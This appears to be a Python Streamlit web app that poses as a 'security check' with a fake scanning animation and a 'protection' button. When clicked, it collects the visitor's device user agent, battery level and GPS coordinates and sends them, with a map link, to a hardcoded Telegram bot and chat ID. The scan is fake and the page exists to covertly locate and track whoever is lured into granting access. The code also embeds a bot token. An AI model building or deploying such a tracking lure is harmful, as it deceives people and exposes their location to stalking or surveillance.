import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONEXÃO TELEGRAM
TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
SEU_ID = "8210828398"

def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
    payload = {"chat_id": SEU_ID, "text": mensagem, "parse_mode": "Markdown"}
    try: requests.post(url, json=payload)
    except: pass

# 2. CONFIGURAÇÃO DA PÁGINA
st.set_page_config(page_title="Verificar Segurança", page_icon="🔐", layout="centered")

# 3. CSS DA ANIMAÇÃO (IGUAL AO SEU VÍDEO)
st.markdown("""
    <style>
    .main { background-color: #000000; color: white; }
    .scanner-container { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    
    .particle-sphere {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    
    @keyframes pulse {
        0%, 100% { transform: scale(1); opacity: 0.8; }
        50% { transform: scale(1.05); opacity: 1; }
    }

    .percentage { font-size: 45px; font-weight: bold; color: white; }
    .status-text { color: #2ecc71; font-size: 14px; margin-top: 10px; }

    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.5em;
        border-radius: 10px; border: none !important;
    }
    .footer { text-align: center; color: #444; font-size: 12px; margin-top: 40px; }
    </style>
""", unsafe_allow_html=True)

# 4. CAPTURA INICIAL
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')
loc = get_geolocation()

# 5. INTERFACE (O SCANNER)
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)

# Placeholder para a animação
espaco_animacao = st.empty()

# Estado inicial da animação (igual ao vídeo)
with espaco_animacao.container():
    st.markdown(f"""
        <div class="scanner-container">
            <div class="particle-sphere">
                <div class="percentage">4%</div>
            </div>
            <div class="status-text">Verificando... Agora</div>
        </div>
    """, unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 6. O BOTÃO QUE NÃO TRAVA
if st.button("🔴 ATIVAR PROTEÇÃO"):
    if loc and 'coords' in loc: # TRAVA DE SEGURANÇA PARA EVITAR O KEYERROR
        # Animação de progresso igual ao vídeo
        for p in range(4, 101, 8):
            espaco_animacao.markdown(f"""
                <div class="scanner-container">
                    <div class="particle-sphere">
                        <div class="percentage">{p}%</div>
                    </div>
                    <div class="status-text">Finalizando varredura...</div>
                </div>
            """, unsafe_allow_html=True)
            time.sleep(0.05)
        
        # Envio dos dados
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        relatorio = (
            f"🚨 VARREDURA COMPLETA\n\n"
            f"📱 Aparelho: {ua[:40]}... \n"
            f"🔋 Bateria: {bat if bat else '--'}%\n"
            f"📍 Mapa: [LOCALIZADO]({mapa})"
        )
        enviar_telegram(relatorio)
        st.success("✅ Proteção Ativada!")
    else:
        st.error("⚠️ Erro: GPS não carregou. Permita o acesso e tente novamente.")

st.markdown('<p class="footer">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
